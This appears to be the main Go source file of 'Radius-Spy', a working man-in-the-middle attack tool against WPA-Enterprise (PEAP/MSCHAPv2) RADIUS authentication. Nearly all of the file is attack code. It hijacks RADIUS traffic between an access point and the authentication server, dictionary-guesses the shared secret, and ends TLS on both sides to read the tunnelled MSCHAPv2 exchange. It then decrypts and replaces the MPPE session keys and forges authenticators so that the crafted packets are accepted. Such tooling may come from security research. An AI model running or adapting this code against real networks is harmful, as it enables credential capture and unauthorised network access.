package main

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"net"
	"radius/attack"
	"radius/eap"
	"radius/radius"
	"radius/session"
	"radius/tlsadditions"

	"github.com/golang/glog"
)

//delayedTLSData struct to hold the TLS data that has been captured but cannot be forwarded because
//the handshake process has not been finished yet.
type delayedTLSData struct {
	tlsContent     []byte
	context        *session.ContextInfo
	peapPacket     *eap.EapPeap
	clientToServer bool
}

var delayedTLSChunks []delayedTLSData

const softVersion = "1.0.0"

const authPort = 1812
const accPort = 1813

const hostName = "169.254.63.10"

const wireless80211Port = 19

var mySession session.Session

func forwardOrDelayTLSData(tlsContent []byte, context *session.ContextInfo, peapPacket *eap.EapPeap, clientToServer bool) {

	tlsSession := context.GetTLSSession()

	tlsChunk := delayedTLSData{
		tlsContent:     tlsContent,
		context:        context,
		peapPacket:     peapPacket,
		clientToServer: clientToServer,
	}

	if (clientToServer && tlsSession.GetServerHandShakeStatus() > 2) || (!clientToServer && tlsSession.GetNASHandShakeStatus() > 2) {
		onTLSData(tlsContent, context, peapPacket, clientToServer)
	} else {
		delayedTLSChunks = append(delayedTLSChunks, tlsChunk)
	}

}

func deliverDelayedTLSData(clientToServer bool) {

	i := 0

	for i < len(delayedTLSChunks) {

		if delayedTLSChunks[i].clientToServer == clientToServer {
			onTLSData(delayedTLSChunks[i].tlsContent, delayedTLSChunks[i].context,
				delayedTLSChunks[i].peapPacket,
				delayedTLSChunks[i].clientToServer)

			delayedTLSChunks = append(delayedTLSChunks[:i], delayedTLSChunks[i+1:]...)
		} else {
			i++
		}

	}

}

func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UDPAddr, clientToServer bool) bool {

	var client, server net.UDPAddr

	forward := true

	//Determine client and server
	if clientToServer {
		client = from
		server = to
	} else {
		client = to
		server = from
	}

	if server.Port == accPort {
		return true //At the moment, we do not do anything for Accounting messages
	}

	glog.V(1).Infoln("***PACKAGE RECEIVED***")

	//Print some useful information about the packet
	glog.V(1).Infoln("From ", from, "to", to)
	glog.V(1).Infoln("Code:", manglePacket.GetCode())
	glog.V(1).Infoln("Id:", manglePacket.GetId())

	//Get the session context by means of the client address
	context := session.GetContextByClient(client)

	//Keep track of the current ID for received packets...
	if clientToServer {

		if context.GetLastNASMsgId() >= manglePacket.GetId() {
			return false //If message received twice, drop it...
		}

		context.SetLastNASMsgId(manglePacket.GetId())
		context.SetLastAuthMsg(manglePacket.GetAuthenticator()) //Keep track also of the
	} else {

		if context.GetLastServerMsgId() >= manglePacket.GetId() {
			return false //If message received twice, drop it...
		}

		context.SetLastServerMsgId(manglePacket.GetId())
	}

	if manglePacket.GetCode() == radius.AccessChallenge {

		//Now, we know the state attribute
		if ok, state := manglePacket.GetState(); ok {
			context.SetState(state)
		}

	}

	if manglePacket.GetCode() == radius.AccessRequest {

		//Retrieve basic information about the client

		updateContextFromPacket(context, manglePacket)

	}

	//Check if there are EAP messages...

	if ok, eapMsg := manglePacket.GetEAPMessage(); ok {

		var eapHeader eap.HeaderEap

		ok = eapHeader.Decode(eapMsg)

		if ok {
			glog.V(1).Infoln("EAP Decode Code:", eapHeader.GetCode())
			glog.V(1).Infoln("EAP Decode ID:", eapHeader.GetId())
			glog.V(1).Infoln("EAP Decode Type:", eapHeader.GetType())
			glog.V(1).Infoln("EAP Decode Length:", eapHeader.GetLength())

			//Success message. We need to modify some fields...
			if eapHeader.GetCode() == eap.EAPSuccess {

				//Delegate the modifications to this function
				processEapSuccessResponse(context, &eapHeader, manglePacket)

			}

			if eapHeader.GetCode() == eap.EAPRequest || eapHeader.GetCode() == eap.EAPResponse {
				eapPacket := eap.GetEAPByType(eapHeader.GetType())

				ok = eapPacket.Decode(eapMsg)

				if ok {

					//Keep track of the last EAP message ID
					if clientToServer {
						context.SetLastNASEapId(eapPacket.GetId())
					} else {
						context.SetLastServerEapId(eapPacket.GetId())
					}

					switch eapPacket.GetType() {
					case eap.Identity:
						identPacket := eapPacket.(*eap.EapIdentity)
						if manglePacket.GetCode() == radius.AccessRequest {
							context.SetEAPIdentity(identPacket.GetIdentity()) //Set EAP identity
						} else {

							glog.V(1).Infoln("Eap identity not expected in this message")
						}
					case eap.LegacyNak:
						legacyNak := eapPacket.(*eap.EapNak)

						glog.V(1).Infoln("Desired Eap method type to authenticate:", legacyNak.GetDesiredType())

						context.SetEapMethod(uint8(legacyNak.GetDesiredType())) //Set desired EAP method

					case eap.Peap:
						peapPacket := eapPacket.(*eap.EapPeap)
						//Set PEAP version
						context.SetPeapVersion(peapPacket.GetVersionFlag())

						if manglePacket.GetCode() == radius.AccessChallenge && peapPacket.GetCode() == eap.EAPRequest {
							forward = manageServerPeap(manglePacket, from, to, peapPacket, context, clientToServer)
						}

						//Manage client TLS Session
						if manglePacket.GetCode() == radius.AccessRequest && peapPacket.GetCode() == eap.EAPResponse {
							forward = manageNASPeap(manglePacket, from, to, peapPacket, context, clientToServer)
						}

					}
				}
			}

		}

	}

	if context.GetSecret() == "" { //No secret discovered
		if ok, secret := attack.GuessSecret(manglePacket.Clone(), client, server, clientToServer); ok {
			context.SetSecret(secret)
		}
	}

	context.PrintInfo()

	return forward

}

func manageServerPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UDPAddr, peapPacket *eap.EapPeap, context *session.ContextInfo, clientToServer bool) bool {

	if peapPacket.GetStartFlag() { //A TLS session is about to start
		glog.V(2).Infoln("PEAP session about to start.")

		//Create a TLS session

		context.CreateTLSSession()

		tlsSession := context.GetTLSSession()

		rawTLSToServer := tlsSession.GetServerTunnel().ReadRaw()
		//rawTLSToServer := tlsSession.ServerReadRaw()

		//At this point, we start to manage the session. Send EAP response to server
		craftedPacket := craftPacketFromTLSPayload(context, rawTLSToServer, manglePacket.GetId()+1, peapPacket.GetId(), !clientToServer, [16]byte{})

		//Send crafted message
		mySession.SendPacket(craftedPacket, !clientToServer)

		//Update handshake status
		tlsSession.SetServerHandShakeStatus(1) //First handshake packet sent

		//Return true here, as we forward the packet so that the NAS Starts also a TLS session with us ;)
		return true
	}

	tlsPayload := peapPacket.GetTLSPayload()

	if len(tlsPayload) > 0 {

		tlsSession := context.GetTLSSession()

		if peapPacket.GetLengthFlag() {
			context.SetServerTLSLength(peapPacket.GetTLSTotalLength())
		}

		context.AddTLSServerPayload(tlsPayload)

		//Check whether we have the whole TLS packet or not.
		if peapPacket.GetMoreFlag() {

			glog.V(2).Infoln("¡¡¡¡¡More frags detected from server!!!!!")

			//Send ACK Eap Message to the Server
			craftedPacket := craftPacketFromTLSPayload(context, nil, manglePacket.GetId()+1,
				peapPacket.GetId(), !clientToServer, [16]byte{})

			//Send crafted message
			mySession.SendPacket(craftedPacket, !clientToServer)

		} else {

			payload, length := context.GetAndDeleteServerTLSPayloadAndLength()

			if length != 0 && uint32(len(payload)) != length {
				glog.V(1).Infoln("EAPMessage --> Length mismatch!! len(payload) -->", len(payload), "length -->", length)

			}

			tlsSession.GetServerTunnel().WriteRaw(payload)

			if tlsSession.GetServerHandShakeStatus() < 2 {

				rawPayload := tlsSession.GetServerTunnel().ReadRaw()

				//Send Eap Message with TLS handshake to the Server
				craftedPacket := craftPacketFromTLSPayload(context, rawPayload, manglePacket.GetId()+1,
					peapPacket.GetId(), !clientToServer, [16]byte{})

				//Send crafted message
				mySession.SendPacket(craftedPacket, !clientToServer)

				tlsSession.SetServerHandShakeStatus(2)

			} else if tlsSession.GetServerHandShakeStatus() == 2 {
				//We received the last TLS handshake message

				//Send ACK message to Server
				craftedPacket := craftPacketFromTLSPayload(context, nil, manglePacket.GetId()+1,
					peapPacket.GetId(), !clientToServer, [16]byte{})

				//Send crafted message
				mySession.SendPacket(craftedPacket, !clientToServer)

				tlsSession.SetServerHandShakeStatus(3)

				deliverDelayedTLSData(!clientToServer)
				glog.V(2).Infoln("Handshake with server OK")

			} else {
				//TLS Payload to handle
				tlsContent := tlsSession.ReadTLSFromServer()

				forwardOrDelayTLSData(tlsContent, context, peapPacket, clientToServer)

			}

		}

	}

	//By default, do not forward the message
	return false

}

func manageNASPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UDPAddr, peapPacket *eap.EapPeap, context *session.ContextInfo, clientToServer bool) bool {

	tlsSession := context.GetTLSSession()

	if tlsSession == nil {
		return false // Peap session already started and we did not manage to create a session previously.
	}

	if !peapPacket.GetLengthFlag() && !peapPacket.GetMoreFlag() && !peapPacket.GetStartFlag() && len(peapPacket.GetTLSPayload()) == 0 {
		//Received Peap Ack message

		if tlsSession.GetNASHandShakeStatus() == 2 { //The handshake process has finished
			tlsSession.SetNASHandShakeStatus(3) //Ack from the client to tell us the TLS session succeded
			deliverDelayedTLSData(!clientToServer)

			glog.V(2).Infoln("Handshake with NAS OK")

			//Calculate Wifi Keys from TLS session
			randomClient := tlsSession.GetRandomClient()
			randomServer := tlsSession.GetRandomServer()
			masterSecret := tlsSession.GetMasterSecret()

			glog.V(3).Infoln("Random Client:")
			glog.V(3).Infoln("\n" + hex.Dump(randomClient[:]))

			glog.V(3).Infoln("Random Server:")
			glog.V(3).Infoln("\n" + hex.Dump(randomServer[:]))

			glog.V(3).Infoln("Master Secret:")
			glog.V(3).Infoln("\n" + hex.Dump(masterSecret[:]))

			glog.V(3).Infoln("Calculating Keys:")

			tlsVersion := tlsSession.GetNASVersion()

			label := "client EAP encryption"

			getKeyringFunc := tlsadditions.EkmFromMasterSecret(tlsVersion, masterSecret[:], randomClient[:], randomServer[:])

			keyringMaterial, err := getKeyringFunc(label, nil, 64)

			if err != nil {
				glog.V(1).Infoln("Error exporting keyring material:", err)
			} else {
				glog.V(3).Infoln("Keyring material:")
				glog.V(3).Infoln("\n" + hex.Dump(keyringMaterial))

				//Derived Key obtained
				context.SetDerivedKey(keyringMaterial)
			}

		}

		//As attacker, we decide to not split the Eap messages into different Radius packets. We avoid handling splitted Eap messages and therefore,
		//the reception of an ACK message should only happen after TLS handshake process has finished, but on the other side,
		//we are "signing" our attack that can be detected by IDS and algorithms of anomaly detection.

	}

	tlsPayload := peapPacket.GetTLSPayload()

	if len(tlsPayload) > 0 {

		if peapPacket.GetLengthFlag() {
			context.SetNASTLSLength(peapPacket.GetTLSTotalLength())
		}

		context.AddTLSNASPayload(tlsPayload)

		//Check whether we have the whole TLS packet or not.
		if peapPacket.GetMoreFlag() {

			//Send ACK Eap Message to the Client
			craftedPacket := craftPacketFromTLSPayload(context, nil, manglePacket.GetId(),
				peapPacket.GetId()+1, !clientToServer, manglePacket.GetAuthenticator())

			//Send crafted message
			mySession.SendPacket(craftedPacket, !clientToServer)

		} else {
			payload, length := context.GetAndDeleteNASTLSPayloadAndLength()

			if length != 0 && uint32(len(payload)) != length {
				glog.V(1).Infoln("EAPMessage --> Length mismatch!! len(payload) -->", len(payload), "length -->", length)
			}

			tlsSession.GetNASTunnel().WriteRaw(payload)
			//tlsSession.NASWriteRaw(payload)

			//Check handshake status
			if tlsSession.GetNASHandShakeStatus() < 2 {

				//Start asynchronous read so that the TLS server side process the handshakes
				if tlsSession.GetNASHandShakeStatus() == 0 {
					tlsSession.GetNASTunnel().ReadTlsAsync()

					//Decode TLS version
					if ok, tlsVersion := tlsadditions.GetVersionFromTLSData(payload); ok {

						if tlsVersion == 0x301 {
							glog.V(2).Infoln("TLS version 1.0")
						} else {
							glog.V(2).Infoln("TLS version NOT 1.0")
						}
						tlsSession.SetNASVersion(tlsVersion)
					}

					glog.V(2).Infoln("TLS Decoding Random Client.")
					//Get Client Random from Client Hello message in TLS handshake message
					if ok, clientRandom := tlsadditions.GetRandomFromTLSData(payload, true); ok {
						glog.V(3).Infoln("TLS Random Client:")
						glog.V(3).Infoln("\n" + hex.Dump(clientRandom))

						tlsSession.SetRandomClient(clientRandom)
					}

				}

				//Read the handshake packet generated by the server
				rawResponse := tlsSession.GetNASTunnel().ReadRaw()

				if tlsSession.GetNASHandShakeStatus() == 0 { //First handshake message that we generate

					glog.V(2).Infoln("TLS Decoding Random Server.")
					//Get Server Random from Server Hello message in TLS handshake message
					if ok, serverRandom := tlsadditions.GetRandomFromTLSData(rawResponse, false); ok {
						glog.V(3).Infoln("TLS Random Server:")
						glog.V(3).Infoln("\n" + hex.Dump(serverRandom))

						tlsSession.SetRandomServer(serverRandom)

					}
				}

				craftedPacket := craftPacketFromTLSPayload(context, rawResponse, manglePacket.GetId(),
					peapPacket.GetId()+1, !clientToServer, manglePacket.GetAuthenticator())

				//Send crafted message
				mySession.SendPacket(craftedPacket, !clientToServer)

				//Go to the following step
				tlsSession.SetNASHandShakeStatus(tlsSession.GetNASHandShakeStatus() + 1)

			} else if tlsSession.GetNASHandShakeStatus() == 3 {
				//First message after Handshake
				//Get the asynchronous data
				tlsContent := <-tlsSession.GetNASTunnel().GetReadTLSChannel()
				forwardOrDelayTLSData(tlsContent, context, peapPacket, clientToServer)
				tlsSession.SetNASHandShakeStatus(4)
			} else {

				tlsContent := tlsSession.GetNASTunnel().ReadTls()
				forwardOrDelayTLSData(tlsContent, context, peapPacket, clientToServer)

			}

		}

	}
	//Packet is not forwarded to the server. Otherwise, the server will be confused when processing legitimate packets and illicit ones.

	return false

}

func craftPacketFromTLSPayload(context *session.ContextInfo, payload []byte, msgID uint8, eapID uint8, clientToServer bool, authenticator [16]byte) *radius.RadiusPacket {

	craftedPacket := radius.NewRadiusPacket()
	craftedPacket.SetId(msgID)

	eapMessage := eap.NewEapPeap()
	eapMessage.SetId(eapID)

	//Add TLS payload
	if payload != nil {
		eapMessage.SetTLSPayload(payload)
	}

	if clientToServer {

		craftedPacket.SetCode(radius.AccessRequest)
		eapMessage.SetCode(eap.EAPResponse)

		//Set NAS context into the packet
		craftedPacket.SetUserName(context.GetUserName())
		craftedPacket.SetNASIp(context.GetNasIP())
		craftedPacket.SetCalledSTAID(context.GetCalledStation())
		craftedPacket.SetNASPortType(context.GetNasPortType())
		craftedPacket.SetNASPort(context.GetNasPort())
		craftedPacket.SetCallingSTAID(context.GetCallingStation())
		craftedPacket.SetConnectInfo(context.GetConnectInfo())
		craftedPacket.SetAccountSession(context.GetAccSessionID())
		craftedPacket.SetFramedMTU(context.GetFramedMTU())

		//Generate random Authenticator

		_, err := rand.Read(authenticator[:])

		if err != nil {
			glog.V(1).Infoln("Error in random function", err)
			return nil
		}

		//Set the randomly generated authenticator field
		craftedPacket.SetAuthenticator(authenticator)

		//Keep track of the last authenticator field generated by us.
		context.SetLastGenAuthMsg(authenticator)

	} else {

		craftedPacket.SetCode(radius.AccessChallenge)
		eapMessage.SetCode(eap.EAPRequest)

	}

	if ok, encodedPEAP := eapMessage.Encode(); ok {
		craftedPacket.SetEAPMessage(encodedPEAP)
	}

	craftedPacket.SetState(context.GetState())

	//We need to recalculate this attribute, otherwise, the message will be rejected
	radius.RecalculateMsgAuth(craftedPacket, authenticator, context.GetSecret())

	//Calculate Response Authenticator for Access Challenge packets
	if craftedPacket.GetCode() == radius.AccessChallenge {
		if ok, auth := radius.CalculateResponseAuth(craftedPacket, authenticator, context.GetSecret()); ok {
			craftedPacket.SetAuthenticator(auth)
		}

	}

	return craftedPacket

}

//This method will receive the content of the TLS session in clear text, no ciphers
func onTLSData(tlsContent []byte, context *session.ContextInfo,
	outerPeapPckt *eap.EapPeap, clientToServer bool) {

	var eapHeader eap.HeaderEap

	glog.V(3).Infoln("onTLSData. Data:")
	glog.V(3).Infoln("\n" + hex.Dump(tlsContent))

	//Forward TLS data
	tlsSession := context.GetTLSSession()
	var rawContent []byte

	var lastMsgID, lastEapID byte

	var authenticator [16]byte

	if clientToServer {
		tlsSession.GetServerTunnel().WriteTls(tlsContent)
		rawContent = tlsSession.GetServerTunnel().ReadRaw()
		lastMsgID = context.GetLastServerMsgId() + 1
		lastEapID = context.GetLastServerEapId()
	} else {
		tlsSession.GetNASTunnel().WriteTls(tlsContent)
		rawContent = tlsSession.GetNASTunnel().ReadRaw()
		lastMsgID = context.GetLastNASMsgId()
		lastEapID = context.GetLastNASEapId() + 1
		authenticator = context.GetLastAuthMsg()
	}

	glog.V(2).Infoln("Forwarding TLS. MSG ID: ", lastMsgID, ", EAP ID:", lastEapID)

	craftedPacket := craftPacketFromTLSPayload(context, rawContent, lastMsgID, lastEapID, clientToServer, authenticator)

	//Send crafted packet
	mySession.SendPacket(craftedPacket, clientToServer)

	//End forward TLS data

	//Start decoding the unencrypted phase 2 tunneled PEAP payload
	//The tunneled payload, which is in cleartext, contains also an EAP message
	//inside the tunneled EAP message a more insecure method is used, for example
	//MsCHAPv2 or GTC and so on.

	//Treat the case in which the header of EAP packet is not included
	//inside the tunnel, but rather the outer EAP header is reused.
	skipChange := false

	//PEAP version equals to 0 does not include the inner EAP header inside the tunnel.
	if context.GetPeapVersion() != 0 {
		skipChange = true
	}

	//If PEAP version = 0, check whether the method is identity.
	//In this case, the inner header is already included.
	if !skipChange && len(tlsContent) == 5 && eap.EapCode(tlsContent[0]) == eap.EAPRequest {
		if ok := eapHeader.Decode(tlsContent); ok {
			if eapHeader.GetType() == eap.Identity && eapHeader.GetLength() == 5 {
				skipChange = true
			}
		}
	}

	if !skipChange && len(tlsContent) >= 5 {
		if ok := eapHeader.Decode(tlsContent); ok {
			if eapHeader.GetType() == eap.TLV {
				skipChange = true
			}
		}

	}

	//Add the outer EAP message (phase 1, PEAP) header as the inner eap header.
	if !skipChange {

		header := make([]byte, 4)

		//Eap code
		header[0] = byte(outerPeapPckt.GetCode())
		//Eap ID (received Eap ID)
		header[1] = byte(outerPeapPckt.GetId())

		//Eap length = payload + 4 bytes appended at the beginning
		//which correspond with the outer PEAP header
		binary.BigEndian.PutUint16(header[2:], uint16(len(tlsContent))+4)
		tlsContent = append(header, tlsContent...)
	}

	glog.V(3).Infoln("onTLSData. Converted data:")
	glog.V(3).Infoln("\n" + hex.Dump(tlsContent))

	//Once we added the missing data, we can proceed to decode the tunneled EAP message.

	glog.V(1).Infoln("Decoding inner EAP message")

	if ok := eapHeader.Decode(tlsContent); ok {
		glog.V(1).Infoln("Inner EAP header decoded-->")
		glog.V(1).Infoln("Code:", eapHeader.GetCode(), ", ID:", eapHeader.GetId())

		if eapHeader.GetCode() == eap.EAPRequest || eapHeader.GetCode() == eap.EAPResponse {
			glog.V(1).Infoln("Method:", eapHeader.GetType())

			eapPacket := eap.GetEAPByType(eapHeader.GetType())

			if ok := eapPacket.Decode(tlsContent); ok {

				switch eapPacket.GetType() {
				case eap.MsChapv2:
					glog.V(1).Infoln("Method MSChapv2")

					msChapv2Packet := eapPacket.(*eap.EapMSCHAPv2)

					manageMsChapV2(msChapv2Packet, context)

				case eap.TLV:
					glog.V(1).Infoln("Method TLV result")

					tlvEap := eapPacket.(*eap.EapTLVResult)

					glog.V(1).Infoln("Result:", tlvEap.GetResult())

				}
			}
		}
	}

	//End decoding tunneled data

}

func manageMsChapV2(packet *eap.EapMSCHAPv2, context *session.ContextInfo) {

	glog.V(2).Infoln("MSChapv2 MsID:", packet.GetMsgID())

	if packet.GetName() != "" {
		glog.V(2).Infoln("MSChapv2 Name:", packet.GetName())
	}

	switch packet.GetOpCode() {
	case eap.MsChapV2Challenge: //Server sends a challenge request
		glog.V(2).Infoln("Received auth challenge")
		glog.V(3).Infoln("\n" + hex.Dump(packet.GetAuthChallenge()))

		context.SetMsChapV2AuthChallenge(packet.GetAuthChallenge())

	case eap.MsChapV2Response: //Peer sends a challenge response
		glog.V(2).Infoln("Received response")
		peerChallenge, ntResponse, _ := eap.MSCHAPv2ExtractFromResponse(packet.GetResponse())

		glog.V(3).Infoln("Peer challenge")
		glog.V(3).Infoln("\n" + hex.Dump(peerChallenge))

		context.SetMsChapV2PeerChallenge(peerChallenge)

		glog.V(3).Infoln("NT-Response")
		glog.V(3).Infoln("\n" + hex.Dump(ntResponse))

		context.SetMsChapV2NTResponse(ntResponse)

		glog.V(2).Infoln("Generating local NT-Response from intercepted data")

		calculatedResponse := eap.MsChapV2GenerateNTResponse(context.GetMsChapV2AuthChallenge(), context.GetMsChapV2PeerChallenge(), context.GetUserName(), "password")

		glog.V(3).Infoln("Local NT-Response")
		glog.V(3).Infoln("\n" + hex.Dump(calculatedResponse))

		glog.V(2).Infoln("Calculating Master key")

		masterKey := eap.MsChapV2GetMasterKeyFromPsswd("password", ntResponse)

		glog.V(3).Infoln("Calculated Master Key:")
		glog.V(3).Infoln("\n" + hex.Dump(masterKey))

		glog.V(2).Infoln("Calculating Send key")

		sendKey := eap.MsChapV2GetSendKey(masterKey)
		glog.V(3).Infoln("Calculated Send Key:")
		glog.V(3).Infoln("\n" + hex.Dump(sendKey))

		glog.V(2).Infoln("Calculating Receive key")

		receiveKey := eap.MsChapV2GetReceiveKey(masterKey)
		glog.V(3).Infoln("Calculated Receive Key:")
		glog.V(3).Infoln("\n" + hex.Dump(receiveKey))

	case eap.MsChapV2Success:

		if packet.GetCode() == eap.EAPRequest { //Server sends a success request

			glog.V(2).Infoln("Received Success request")
			glog.V(2).Infoln("Message from server:", packet.GetMessage())

			context.SetServerMessage(packet.GetMessage())

			//Calculate ourselves the result of the message field

			calcMessage := eap.MsChapV2GenerateAuthenticatorResponse("password", context.GetMsChapV2NTResponse(),
				context.GetMsChapV2PeerChallenge(), context.GetMsChapV2AuthChallenge(), context.GetUserName())

			glog.V(2).Infoln("Calculated message:", calcMessage)

		}

	}

}

//processEapSuccessResponse will process the EAP success reponse message from the server and
// recalculate the fields necessary for the NAS to consider the packet as valid

//context is the context of the current authenticating peer and server
func processEapSuccessResponse(context *session.ContextInfo, eapHeader *eap.HeaderEap, manglePacket *radius.RadiusPacket) {

	//From the context, retrieve the last EAP msg ID received from the authenticating peer to answer it back with the correct ID.
	//As we are doing the requests, is our task to increase in one the ID, so that the peer will reponse with the same ID.
	eapHeader.SetId(context.GetLastNASEapId() + 1)

	//Encode again the EAP success message to be included in our fake crafted packet
	if ok, encodedEAP := eapHeader.Encode(); ok {

		//Inside the original radius packet, the EAP message is reinserted as part of the
		//attributes of the RADIUS message (fragmented if necessary).
		manglePacket.SetEAPMessage(encodedEAP)

		//If we receive a Access Accept message, recalculate the authenticator field to make it valid to the NAS.
		//We must also modify the IDs of the RADIUS message
		if manglePacket.GetCode() == radius.AccessAccept {

			var sndKeyAttr, rcvKeyAttr []byte

			//Obtain the MPPE receive key
			if ok, rcvKey := manglePacket.GetMSMPPERecvKey(); ok {
				glog.V(1).Infoln("MPPE Recv key intercepted")
				glog.V(3).Infoln("\n" + hex.Dump(rcvKey))

				//Decrypt key
				glog.V(2).Infoln("Decrypt recv key")
				if ok, decryptedRcvKey := radius.DecryptKeyFromMPPE(rcvKey, context.GetLastGenAuthMsg(), context.GetSecret()); ok {
					glog.V(3).Infoln("\n" + hex.Dump(decryptedRcvKey))

					//This key is based in TLS session between us and Radius Server which differs
					//from the TLS session created between the wireless peer and us.

					//Take our previously derived key calculated after the TLS 4-way handshake process between peer and us (intruder)
					derivedKey := context.GetDerivedKey()

					//Encrypt it to resend the key to the NAS. The NAS must decode and obtain the
					//same keys that the peer has generated from the 4-way handhake process between us and the peer.
					if ok, encryptedRcvKey := radius.EncryptKeyToMPPE(derivedKey[:32],
						context.GetLastAuthMsg(), context.GetSecret()); ok {
						rcvKeyAttr = encryptedRcvKey

					}

				} else {
					glog.V(2).Infoln("Failed")

				}

			}

			//Obtain the MPPE send key
			if ok, sndKey := manglePacket.GetMSMPPESendKey(); ok {
				glog.V(1).Infoln("MPPE Send key intercepted")
				glog.V(3).Infoln("\n" + hex.Dump(sndKey))

				//Decrypt key
				glog.V(2).Infoln("Decrypt send key:")
				if ok, decryptedSndKey := radius.DecryptKeyFromMPPE(sndKey, context.GetLastGenAuthMsg(), context.GetSecret()); ok {
					glog.V(3).Infoln("\n" + hex.Dump(decryptedSndKey))

					//This key is based in TLS session between us and Radius Server which differs
					//from the TLS session created between the wireless peer and us.

					//Take our previously derived key calculated after the TLS 4-way handshake process between peer and us (intruder)
					derivedKey := context.GetDerivedKey()

					//Encrypt it to resend the key to the NAS. The NAS must decode and obtain the
					//same keys that the peer has generated from the 4-way handhake process between us and the peer.
					if ok, encryptedSndKey := radius.EncryptKeyToMPPE(derivedKey[32:64],
						context.GetLastAuthMsg(), context.GetSecret()); ok {
						sndKeyAttr = encryptedSndKey

					}

				} else {
					glog.V(2).Infoln("Failed")
				}
			}

			//Update the MPPE attributes (vendor specific from Microsoft) with the correct key values derived from the TLS handshake.
			if sndKeyAttr != nil && rcvKeyAttr != nil {
				manglePacket.SetMSMPPEKeys(sndKeyAttr, rcvKeyAttr)
			}

			//Modify the current RADIUS ID for the message with the last ID received from the NAS so that
			//the message is well interpreted by the NAS.
			manglePacket.SetId(context.GetLastNASMsgId())

			//Once all the fields have been recalculated, one need to update also the
			//correct message-authenticator attribute.
			radius.RecalculateMsgAuth(manglePacket, context.GetLastAuthMsg(), context.GetSecret())

			//Finally, update the response authenticator based on a hash applied to the whole content of
			//the message by making use also of the secret shared between NAS and RADIUS server.
			if ok, auth := radius.CalculateResponseAuth(manglePacket, context.GetLastAuthMsg(), context.GetSecret()); ok {
				manglePacket.SetAuthenticator(auth)
			}

		}
	}

}

func updateContextFromPacket(context *session.ContextInfo, manglePacket *radius.RadiusPacket) {

	//NAS Port Type
	if ok, nasPortType := manglePacket.GetNASPortType(); ok {
		context.SetNasPortType(nasPortType)

		if nasPortType == wireless80211Port {
			glog.V(1).Infoln("WIFI network Authetication!!")

			//Set the current user name if not done before
			if ok, user := manglePacket.GetUserName(); ok {
				context.SetUserName(user)
			}

			//Set calling station
			if ok, callingSta := manglePacket.GetCallingSTAID(); ok {
				context.SetCallingStation(callingSta)
			}

		}

	}

	//NAS Port
	if ok, nasPort := manglePacket.GetNASPort(); ok {
		context.SetNasPort(nasPort)
	}

	//NAS IP
	if ok, nasIP := manglePacket.GetNASIp(); ok {
		context.SetNasIP(nasIP)
	}

	//Called STA
	if ok, calledSTA := manglePacket.GetCalledSTAID(); ok {
		context.SetCalledStation(calledSTA)
	}

	//Framed MTU
	if ok, framedMTU := manglePacket.GetFramedMTU(); ok {
		context.SetFramedMTU(framedMTU)
	}

	//Connect Info
	if ok, connectInfo := manglePacket.GetConnectInfo(); ok {
		context.SetConnectInfo(connectInfo)
	}

	//Acc Session
	if ok, accSession := manglePacket.GetAccountSession(); ok {
		context.SetAccSessionID(accSession)
	}

}

func main() {

	secrets := flag.String("secrets", "secrets.txt", "Secrets file to perform dictionary attacks")

	active := flag.Bool("active", false, "When activated, communications will be intercepted, otherwise, we only forward packets")

	flag.Parse()

	session.SetConfig(*secrets)

	glog.V(0).Infoln("Radius-Spy. Version", softVersion)

	//Init session

	mode := session.Passive

	if *active {
		mode = session.Active
		glog.V(1).Infoln("Mode active")
	} else {
		glog.V(1).Infoln("Mode passive")
	}

	glog.V(0).Infoln("Initializing...")

	mySession.Init(mode, hostName, authPort, accPort)

	glog.V(0).Infoln("Hijacking session...")

	mySession.Hijack(manglePacket)
}
